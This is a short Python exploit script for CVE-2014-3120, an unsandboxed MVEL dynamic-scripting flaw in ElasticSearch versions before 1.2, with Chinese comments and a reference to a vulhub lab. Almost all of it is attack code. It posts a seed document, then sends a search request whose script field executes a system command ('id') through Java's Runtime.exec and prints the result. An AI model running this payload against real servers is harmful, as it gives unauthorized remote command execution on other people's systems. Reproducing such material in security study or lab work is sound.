#@author Firbasky
#参考https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#解决ssl链接报错

"""
老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，
而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。

影响版本：ElasticSearch 1.2之前的版本
"""

url = "http://ip"

add = {
  "name": "Firebasky"
}
exp = {
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}

add = json.dumps(add)
exp = json.dumps(exp)
headers = {"Content-type": "application/json","Accept": "*/*"}
#需要添加一条数据
requests.request("POST",url=url+"/website/blog/",data=add,verify=False,headers=headers)
#执行命令
r=requests.request("POST",url=url+"/_search?pretty",verify=False,data=exp,headers=headers)
print(r.text)
